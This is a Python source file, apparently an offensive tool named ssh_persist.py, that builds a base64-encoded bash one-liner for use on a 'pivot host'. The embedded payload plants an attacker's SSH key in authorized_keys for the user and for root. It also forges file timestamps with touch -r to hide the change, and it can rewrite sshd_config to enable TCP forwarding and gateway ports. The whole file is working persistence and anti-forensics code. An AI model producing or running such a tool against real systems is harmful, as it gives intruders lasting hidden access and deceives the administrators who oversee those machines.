#!/usr/bin/env python3
from __future__ import annotations

import argparse
import base64
import binascii
import hashlib
import ipaddress
import os
import shlex
import shutil
import subprocess
import sys
from dataclasses import dataclass
from pathlib import Path
from textwrap import dedent


GREEN = "\033[1;92m"
KEY_TYPE_PATTERN = (
    r"^(ssh-(rsa|ed25519|dss)|ecdsa-sha2-nistp(256|384|521)|"
    r"sk-ecdsa-sha2-nistp256@openssh.com|sk-ssh-ed25519@openssh.com)$"
)
RESET = "\033[0m"
SUPPORTED_KEY_TYPES = {
    "ssh-ed25519",
    "ssh-rsa",
    "ssh-dss",
    "ecdsa-sha2-nistp256",
    "ecdsa-sha2-nistp384",
    "ecdsa-sha2-nistp521",
    "sk-ecdsa-sha2-nistp256@openssh.com",
    "sk-ssh-ed25519@openssh.com",
}
REMOTE_PAYLOAD_BODY = dedent(
    """
    if [[ -z "$TARGET_USER" ]]; then
      TARGET_USER="$(id -un 2>/dev/null || true)"
      [[ -z "$TARGET_USER" ]] && TARGET_USER="$(whoami 2>/dev/null || true)"
      [[ -z "$TARGET_USER" ]] && TARGET_USER="${USER:-}"
    fi

    if [[ -z "$TARGET_USER" ]]; then
      echo "Error: could not determine the current user on the pivot host. Use --user <username>." >&2
      exit 1
    fi

    if [[ "$ACCESS_MODE" == "high" && "$TARGET_USER" == "root" ]]; then
      TARGET_USER=""
    fi

    preserve_time() {
      local ref="$1" target="$2"
      if [[ -n "$ref" && -e "$ref" && -e "$target" ]]; then
        touch -r "$ref" "$target"
      fi
    }

    snapshot_time_ref() {
      local path="$1"
      local ref

      [[ -e "$path" ]] || return 0

      ref="$(mktemp)"
      touch -r "$path" "$ref"
      printf '%s\\n' "$ref"
    }

    cleanup_time_ref() {
      local ref="$1"
      if [[ -n "$ref" && -e "$ref" ]]; then
        rm -f "$ref"
      fi
    }

    resolve_home() {
      local user="$1"
      local home

      home="$(getent passwd "$user" | cut -d: -f6 || true)"
      if [[ -z "$home" ]]; then
        echo "Error: user '$user' was not found on the pivot host." >&2
        return 1
      fi
      printf '%s\\n' "$home"
    }

    line_has_same_key() {
      local line="$1"
      local -a fields=()
      local index=0
      local token=""
      local blob=""

      [[ -z "$line" || "$line" == \\#* ]] && return 1

      read -r -a fields <<< "$line"
      while (( index < ${#fields[@]} )); do
        token="${fields[$index]}"
        if [[ "$token" =~ $KEY_TYPE_PATTERN ]]; then
          blob="${fields[$((index + 1))]:-}"
          [[ "$token" == "$KEY_TYPE" && "$blob" == "$KEY_BLOB" ]]
          return $?
        fi
        ((index += 1))
      done

      return 1
    }

    authfile_has_same_key() {
      local authfile="$1"
      local line=""

      [[ -f "$authfile" ]] || return 1

      while IFS= read -r line || [[ -n "$line" ]]; do
        if line_has_same_key "$line"; then
          return 0
        fi
      done < "$authfile"

      return 1
    }

    add_key() {
      local user="$1"
      local home sshdir authfile
      local home_ts_ref="" ssh_ts_ref="" auth_ts_ref=""
      local changed=0

      home="$(resolve_home "$user")"
      sshdir="$home/.ssh"
      authfile="$sshdir/authorized_keys"

      home_ts_ref="$(snapshot_time_ref "$home")"
      ssh_ts_ref="$(snapshot_time_ref "$sshdir")"
      auth_ts_ref="$(snapshot_time_ref "$authfile")"

      if [[ ! -d "$sshdir" ]]; then
        install -d -m 700 -o "$user" -g "$user" "$sshdir"
        changed=1
      else
        chmod 700 "$sshdir"
        chown "$user:$user" "$sshdir"
      fi

      if [[ -f "$authfile" ]]; then
        chmod 600 "$authfile"
        chown "$user:$user" "$authfile"
        if ! authfile_has_same_key "$authfile"; then
          printf '%s\\n' "$KEY_ENTRY" >> "$authfile"
          changed=1
        fi
      else
        printf '%s\\n' "$KEY_ENTRY" > "$authfile"
        chmod 600 "$authfile"
        chown "$user:$user" "$authfile"
        changed=1
      fi

      if [[ "$changed" -eq 1 ]]; then
        if [[ -n "$auth_ts_ref" ]]; then
          preserve_time "$auth_ts_ref" "$authfile"
        elif [[ -n "$ssh_ts_ref" ]]; then
          preserve_time "$ssh_ts_ref" "$authfile"
        elif [[ -n "$home_ts_ref" ]]; then
          preserve_time "$home_ts_ref" "$authfile"
        fi

        if [[ -n "$ssh_ts_ref" ]]; then
          preserve_time "$ssh_ts_ref" "$sshdir"
        elif [[ -n "$home_ts_ref" ]]; then
          preserve_time "$home_ts_ref" "$sshdir"
        fi

        if [[ -n "$home_ts_ref" ]]; then
          preserve_time "$home_ts_ref" "$home"
        fi
      fi

      cleanup_time_ref "$auth_ts_ref"
      cleanup_time_ref "$ssh_ts_ref"
      cleanup_time_ref "$home_ts_ref"
    }

    ensure_sshd_block() {
      local sshd_cfg="$1"
      local users="$2"
      local changed_ref="$3"

      has_complete_match_block() {
        awk -v users="$1" '
          $1=="Match" && $2=="User" && $3==users {inblock=1; next}
          inblock && $1=="Match" {exit}
          inblock {
            if ($1=="PubkeyAuthentication" && $2=="yes") has_pub=1
            if ($1=="AllowTcpForwarding" && $2=="yes") has_fwd=1
            if ($1=="GatewayPorts" && $2=="clientspecified") has_gateway=1
          }
          END { exit !(inblock && has_pub && has_fwd && has_gateway) }
        ' "$sshd_cfg"
      }

      if ! has_complete_match_block "$users"; then
        printf '\\nMatch User %s\\n    PubkeyAuthentication yes\\n    AllowTcpForwarding yes\\n    GatewayPorts clientspecified\\n' "$users" >> "$sshd_cfg"
        printf -v "$changed_ref" '%s' 1
      fi
    }

    if [[ "$ACCESS_MODE" == "low" ]]; then
      add_key "$TARGET_USER"
      exit 0
    fi

    add_key root
    [[ -n "$TARGET_USER" ]] && add_key "$TARGET_USER"

    if [[ "$STEALTH" -eq 0 ]]; then
      if [[ "$MODIFY_SSHD" -eq 1 ]]; then
        SSHD_CFG="${SSH_PERSIST_SSHD_CONFIG:-/etc/ssh/sshd_config}"
        SSHD_TS_REF="$(snapshot_time_ref "$SSHD_CFG")"
        changed=0

        users="root"
        [[ -n "$TARGET_USER" ]] && users="root,$TARGET_USER"

        ensure_sshd_block "$SSHD_CFG" "$users" changed

        if [[ "$changed" -eq 1 ]]; then
          sshd -t -f "$SSHD_CFG"

          if systemctl is-active sshd >/dev/null 2>&1; then
            systemctl reload sshd 2>/dev/null || systemctl restart sshd
          else
            service ssh reload 2>/dev/null || service ssh restart
          fi

          preserve_time "$SSHD_TS_REF" "$SSHD_CFG"
        fi

        cleanup_time_ref "$SSHD_TS_REF"
      fi
    fi
    """
).strip()


@dataclass(frozen=True)
class PublicKey:
    key_type: str
    blob: str
    comment: str
    fingerprint: str

    @property
    def normalized(self) -> str:
        if self.comment:
            return f"{self.key_type} {self.blob} {self.comment}"
        return f"{self.key_type} {self.blob}"


def create_argument_parser(*args, **kwargs) -> argparse.ArgumentParser:
    try:
        return argparse.ArgumentParser(*args, color=False, **kwargs)
    except TypeError:
        return argparse.ArgumentParser(*args, **kwargs)


def valid_remote_ip(value: str) -> str:
    try:
        ipaddress.ip_address(value)
    except ValueError as exc:
        raise argparse.ArgumentTypeError(f"Invalid IP address: {value}") from exc
    return value


def normalize_legacy_argv(argv: list[str] | None) -> list[str] | None:
    if argv is None:
        return None

    normalized: list[str] = []
    for token in argv:
        if token == "-key":
            normalized.append("--key")
        elif token == "-low":
            normalized.extend(["--mode", "low"])
        elif token == "-high":
            normalized.extend(["--mode", "high"])
        else:
            normalized.append(token)
    return normalized


def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    argv = normalize_legacy_argv(argv)
    parser = create_argument_parser(
        description="Generate a bash one-liner that deploys SSH persistence on a pivot host.",
        epilog=dedent(
            """
            Examples:
              ssh_persist.py --key ~/.ssh/id_ed25519.pub
              ssh_persist.py --key ~/.ssh/id_ed25519.pub --mode high --username alice
              ssh_persist.py --key ~/.ssh/id_ed25519.pub --mode high --username alice --noise
              ssh_persist.py --key "ssh-ed25519 AAAA... alice@host" --remote-ip 10.10.10.10 --show
            """
        ).strip(),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "-k",
        "--key",
        required=True,
        metavar="KEY",
        help="SSH public key string or path to a .pub file.",
    )
    parser.add_argument(
        "-m",
        "--mode",
        choices=("low", "high"),
        metavar="MODE",
        default="low",
        help="Persistence mode: low adds the key to one user, high also handles root access.",
    )
    parser.add_argument(
        "-u",
        "--username",
        dest="user",
        metavar="USER",
        help="Target user. If omitted, the current user is resolved on the pivot host.",
    )
    parser.add_argument(
        "-rip",
        "--remote-ip",
        dest="remote_ip",
        type=valid_remote_ip,
        metavar="IP",
        help='Restrict the authorized_keys entry with from="<ip>".',
    )
    parser.set_defaults(modify_sshd=False)
    parser.add_argument(
        "--noise",
        dest="modify_sshd",
        action="store_true",
        help="In high mode, update sshd_config to allow SSH pivoting features.",
    )
    parser.add_argument(
        "--show",
        dest="show",
        action="store_true",
        help="Show the final command even if clipboard copy succeeds.",
    )
    args = parser.parse_args(argv)
    if args.modify_sshd and args.mode != "high":
        parser.error("--noise is only supported in high mode.")
    return args


def looks_like_path(value: str) -> bool:
    return value.startswith("~") or "/" in value or ("\\" in value) or value.endswith(".pub")


def read_public_key_input(source: str) -> str:
    candidate = Path(source).expanduser()
    if candidate.is_file():
        return candidate.read_text(encoding="utf-8").strip()
    if looks_like_path(source):
        raise ValueError(f"key file not found: {source}")
    return source.strip()


def parse_public_key(raw_value: str) -> PublicKey:
    if not raw_value:
        raise ValueError("empty SSH public key input")
    if any(char in raw_value for char in "\r\n"):
        raise ValueError("SSH public key input must be a single line")

    parts = raw_value.split()
    if len(parts) < 2:
        raise ValueError("invalid SSH public key format")

    key_type, blob = parts[0], parts[1]
    if key_type not in SUPPORTED_KEY_TYPES:
        raise ValueError(f"unsupported SSH public key type: {key_type}")

    try:
        decoded = base64.b64decode(blob.encode("ascii"), validate=True)
    except (binascii.Error, UnicodeEncodeError) as exc:
        raise ValueError("invalid SSH public key blob") from exc

    if not decoded:
        raise ValueError("empty SSH public key blob")

    comment = " ".join(parts[2:])
    if any(ord(char) < 32 for char in comment):
        raise ValueError("invalid SSH public key comment")

    fingerprint = base64.b64encode(hashlib.sha256(decoded).digest()).decode("ascii").rstrip("=")
    return PublicKey(key_type=key_type, blob=blob, comment=comment, fingerprint=f"SHA256:{fingerprint}")


def build_key_entry(public_key: PublicKey, remote_ip: str | None) -> str:
    if remote_ip:
        return f'from="{remote_ip}" {public_key.normalized}'
    return public_key.normalized


def build_remote_payload(args: argparse.Namespace, public_key: PublicKey, key_entry: str) -> str:
    assignments = [
        "set -e",
        f"ACCESS_MODE={shlex.quote(args.mode)}",
        f"MODIFY_SSHD={shlex.quote('1' if args.modify_sshd else '0')}",
        f"TARGET_USER={shlex.quote(args.user or '')}",
        f"KEY_ENTRY={shlex.quote(key_entry)}",
        f"KEY_TYPE={shlex.quote(public_key.key_type)}",
        f"KEY_BLOB={shlex.quote(public_key.blob)}",
        f"KEY_TYPE_PATTERN={shlex.quote(KEY_TYPE_PATTERN)}",
    ]
    return "\n".join(assignments) + "\n\n" + REMOTE_PAYLOAD_BODY + "\n"


def build_runner_command(payload: str) -> str:
    encoded = base64.b64encode(payload.encode("utf-8")).decode("ascii")
    return f"bash -c 'echo {encoded} | base64 -d | bash'"


def clipboard_candidates() -> list[list[str]]:
    commands: list[list[str]] = []
    if shutil.which("pbcopy"):
        commands.append(["pbcopy"])
    if os.environ.get("WAYLAND_DISPLAY") and shutil.which("wl-copy"):
        commands.append(["wl-copy"])
    if os.environ.get("DISPLAY") and shutil.which("xclip"):
        commands.append(["xclip", "-selection", "clipboard"])
    if shutil.which("wl-copy"):
        commands.append(["wl-copy"])
    if shutil.which("xclip"):
        commands.append(["xclip", "-selection", "clipboard"])
    if shutil.which("clip.exe"):
        commands.append(["clip.exe"])
    if shutil.which("clip"):
        commands.append(["clip"])
    if shutil.which("powershell.exe"):
        commands.append(
            [
                "powershell.exe",
                "-NoProfile",
                "-Command",
                "Set-Clipboard -Value ([Console]::In.ReadToEnd())",
            ]
        )
    return commands


def copy_to_clipboard(text: str) -> bool:
    for command in clipboard_candidates():
        result = subprocess.run(command, input=text, text=True, capture_output=True)
        if result.returncode == 0:
            return True
    return False


def print_clipboard_hints() -> None:
    print()
    print("Clipboard hints:")

    if sys.platform.startswith("linux") and os.environ.get("WAYLAND_DISPLAY") and not shutil.which("wl-copy"):
        print("  - For Wayland, install wl-clipboard (wl-copy/wl-paste).")
    if sys.platform.startswith("linux") and os.environ.get("DISPLAY") and not shutil.which("xclip"):
        print("  - For X11, install xclip.")

    print("  - On Windows/WSL, try clip.exe or PowerShell Set-Clipboard.")


def emit_output(command: str, mode: str, show: bool, copied: bool, clipboard_available: bool) -> None:
    if show or not copied:
        print()
        if mode == "high":
            print("Run on the pivot host as root:")
        else:
            print("Run on the pivot host:")
        print()
        print(command)
        print()

    if copied:
        print(f"{GREEN}Command successfully copied to the clipboard.{RESET}")
        if mode == "high":
            print("Execute the copied command on the pivot host as root.")
        return

    if clipboard_available:
        print("Failed to copy the command to the clipboard; please copy it manually.")
    else:
        print_clipboard_hints()


def main(argv: list[str] | None = None) -> int:
    try:
        args = parse_args(argv if argv is not None else sys.argv[1:])
        raw_key = read_public_key_input(args.key)
        public_key = parse_public_key(raw_key)
        key_entry = build_key_entry(public_key, args.remote_ip)
        payload = build_remote_payload(args, public_key, key_entry)
        command = build_runner_command(payload)
    except ValueError as exc:
        print(f"Error: {exc}", file=sys.stderr)
        return 1

    clipboard_available = bool(clipboard_candidates())
    copied = copy_to_clipboard(command) if clipboard_available else False
    emit_output(command, args.mode, args.show, copied, clipboard_available)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
